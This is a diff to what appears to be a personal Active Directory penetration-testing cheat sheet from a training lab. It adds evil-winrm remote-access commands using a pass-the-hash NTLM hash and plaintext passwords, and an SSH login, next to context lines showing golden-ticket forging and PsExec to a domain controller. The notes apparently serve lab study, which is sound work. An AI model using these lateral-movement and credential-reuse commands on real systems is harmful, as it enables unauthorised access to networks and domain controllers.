@@ -3050,9 +3050,17 @@ kerberos::golden /User:vegeta /domain:tech.local /sid:S-1-5-21-4215187987-312420
 ```
 .\PsExec.exe -accepteula \\dcorp-dc cmd
 ```
-
-
-
+##### REMOTE ACCESS - EVIL-WINRM
+```
+evil-winrm -i 172.16.100.9 -u 'dcorp\student209' -H 2e21dc42bfb4812954a6bc5a01021d53
+evil-winrm -i 172.16.100.9 -u 'dcorp\student209' -p m2RrLCevS8WG6pdadsTh
+evil-winrm -i 172.16.100.9 -u 'dcorp\student209' -p m2RrLCevS8WG6pasdTh -s c:\scripts
+evil-winrm -i 172.16.100.9 -u 'dcorp\student209' -p m2RrLCevS8WG6pasdTh -e c:\exes
+```
+##### REMOTE ACCESS - SSH
+```
+ssh 172.16.100.9 -l 'dcorp\student209'
+```
 
 
 
